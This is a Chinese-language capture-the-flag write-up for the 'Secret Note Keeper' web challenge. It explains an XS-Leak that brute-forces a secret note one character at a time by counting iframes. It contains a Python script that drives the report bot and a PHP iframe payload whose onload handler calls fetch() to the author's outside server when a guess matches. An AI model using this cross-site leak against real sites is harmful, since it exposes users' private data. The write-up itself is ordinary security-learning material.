# Secret Note Keeper

## 題目分析

- 這題乍看之下功能跟 35C3 filemanager 沒啥兩樣
    - login/logout/register
    - Add Note
    - Search Note
    - Report Bug
- 回報自己的 domain 看一下 BOT 的 User-Agent:
    - `HeadlessChrome/74.0.3729.169 Safari/537.36`
    - Chrome 74，看起來沒辦法用 XSS Auditor 去判斷
- 踹了一下，發現有兩種特殊字元
    - `_`能匹配任意一個字元
    - `%`能匹配任意多個字元
- 另外在 Search Note ，如果有找到時，會用 iframe 把該 note 抓進來

## Exploit

- 這題很明顯想考 XS-Leak
- 到這邊大概就能想到可以利用 frame count 去判斷是否有找到 Note
    - 有找到 => frame count >= 1
    - 沒找到 => frame count = 0

- 寫個腳本暴力搜一下就行:

```python
import requests
import hashlib
import re


def POW(target):
    mx = 10 ** 9
    nonce = 0
    while nonce < mx:
        string = str(nonce)
        hash_result = hashlib.md5(string).hexdigest()
        if hash_result.startswith(target):
            print(hash_result)
            return string
        nonce += 1

alphabet = "@#$%^&*()-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

for i in alphabet:

    cookie = {"session":"286b4d92-cf9d-4d8e-9da2-0d0ce6317ac2", "session":".eJwljjkOwzAMBP_C2oUOkiL9mUA8hKS14yrI32Mg2HJmgP3AYx15PmF_H1du8HgF7CAqXNVwJmG0qj0saBWt6qUPjegmprfC5u6JVKVRXblWcZ73PI14Yl9cR5_CLDciTjJyq3fVE4uMKbpKM13JEpjC3tpAD9jgOvP4n8HW4PsDAtIvzQ.XPJRVA.1J6roM-pNGSVmS9OS0rJr_BICpI;"}

    r = requests.get("http://challenges.fbctf.com:8082/report_bugs", cookies=cookie)
    #print(r.cookies)

    x = re.findall("proof of work for (.*) \(", r.text)
    print(x[0])

    ans = POW(x[0])
    print "ans:" + ans

    r2 = requests.post("http://challenges.fbctf.com:8082/report_bugs", data={"link":"http://kaibro.tw/log.php?1="+i, "pow_sol":ans, "body":"","title":""}, cookies=r.cookies)
    print r2.text
```

其中 log.php:

```php
<iframe src="http://challenges.fbctf.com:8082/search?query=fb{cr055_s173_l34<?php echo $_GET[1];?>%}" onload="if(this.contentWindow.length>=1){fetch('http://kaibro.tw/?fb=ok');}">
```

如果收到 `ok` 就代表找到該字元，就能繼續爆下一個字元

flag: `fb{cr055_s173_l34|<5_4r4_c00ool!!}`
